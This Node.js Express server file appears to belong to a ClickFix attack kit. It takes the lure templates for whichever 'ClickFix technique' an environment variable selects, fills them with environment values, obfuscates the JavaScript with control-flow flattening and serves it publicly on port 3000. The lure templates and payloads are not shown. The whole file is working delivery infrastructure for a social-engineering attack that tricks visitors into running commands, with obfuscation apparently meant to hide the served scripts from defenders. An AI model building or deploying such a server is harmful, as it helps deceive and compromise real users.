const mustache = require('mustache');
const obfuscator = require('javascript-obfuscator');
const fs = require('fs');
const path = require('path');
const express = require('express');

const app = express();
const sourceDir = path.join(__dirname, process.env.CLICKFIX_TECHNIQUE_IN_USE)
const outputDir = path.join(__dirname, 'public');
fs.readdirSync(outputDir).forEach(entry => {
  const entryPath = path.join(outputDir, entry);
  fs.rmSync(entryPath, { recursive: true, force: true });
});
fs.mkdirSync(outputDir, { recursive: true });
fs.readdirSync(sourceDir).forEach(file => {
  if (file.endsWith('.js')) {
    const inputPath = path.join(sourceDir, file);
    const outputPath = path.join(outputDir, file);
    const rawTemplate = fs.readFileSync(inputPath, 'utf8');
    const rendered = mustache.render(rawTemplate, process.env);
    const obfuscated = obfuscator.obfuscate(rendered, {
      compact: true,
      controlFlowFlattening: true
    }).getObfuscatedCode();
    fs.writeFileSync(outputPath, obfuscated);
  } else {
    fs.copyFileSync(path.join(sourceDir, file), path.join(outputDir, file));
  }
})

app.use(express.static("public"));

app.listen(3000, () => {
  console.log(`Server running at http://0.0.0.0:3000`);
});